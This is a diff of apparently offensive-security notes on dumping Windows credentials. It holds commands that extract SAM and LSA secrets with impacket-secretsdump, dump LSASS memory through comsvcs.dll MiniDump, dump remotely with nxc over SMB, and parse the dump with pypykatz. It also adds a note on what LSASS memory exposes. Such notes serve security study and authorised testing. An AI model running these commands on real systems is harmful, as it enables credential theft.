@@ -179,7 +179,7 @@ $ impacket-secretsdump -sam sam.hive -security security.hive -system system.hive
 
 You can also dump credentials saved in process memory. There are two methods: dumping the LSA process and analyzing it on Linux OR dumping and analyzing the result on Windows.
 
-* Dump LSA Process <small>(Admin Shell Required)</small>
+* **Dump LSA Process Memory** <small>(Admin Shell Required/No Admin for TM?)</small>
 
 ```shell!
 $ tasklist /svc | findstr "lsa"
@@ -191,13 +191,16 @@ $ Get-Process lsass | Select Id
 $ rundll32 C:\windows\system32\comsvcs.dll, MiniDump 4242 C:\lsass.dmp full
 <detected by antivirus>
 ```
+
 ```ps
 $ nxc smb IP --local-auth -u xxx -p yyy --lsa # remote dump
 ```
 
 Lastly, you can also open the task manager, right-click on the LSAP process and select 'Create dump file.'
 
-* Analyzing LSA Process Dump on Linux using [pypykatz](https://github.com/skelsec/pypykatz) <small>(2.6k ⭐)</small>
+📚 The LSASS memory contains the DPAPI masterkey for the logged user. It can be used to decrypt credentials for applications that use it. It also contains tickets, and [wDIGEST](https://learn.microsoft.com/en-us/windows/win32/secauthn/microsoft-digest-authentication) cleartext credentials.
+
+* **Analyzing LSA Process Dump** on Linux using [pypykatz](https://github.com/skelsec/pypykatz) <small>(2.6k ⭐)</small>
 
 ```shell!
 $ pypykatz lsa minidump lsass.dmp
